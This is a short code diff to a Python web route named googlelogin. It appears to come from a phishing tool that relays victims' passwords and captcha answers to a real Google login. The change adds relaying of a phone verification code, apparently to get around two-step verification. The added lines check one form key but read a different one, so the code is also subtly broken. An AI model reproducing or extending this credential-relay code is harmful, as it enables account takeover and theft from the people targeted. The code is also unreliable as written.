@@ -104,11 +104,16 @@ def googlelogin():
 
 			if core.send_mail():
 				core.send_password()
-				
+
 		if 'captcha' in request.form:
 			captcha_text = request.form['captcha']
 			core.send_captcha(captcha_text)
 			core.send_password()
+
+		if 'phone_code' in request.form:
+			phone_code = request.form['send_phone_code']
+			core.send_phone_code(phone_code)
+
 		if core.check_login():
 			core.start_active()
 
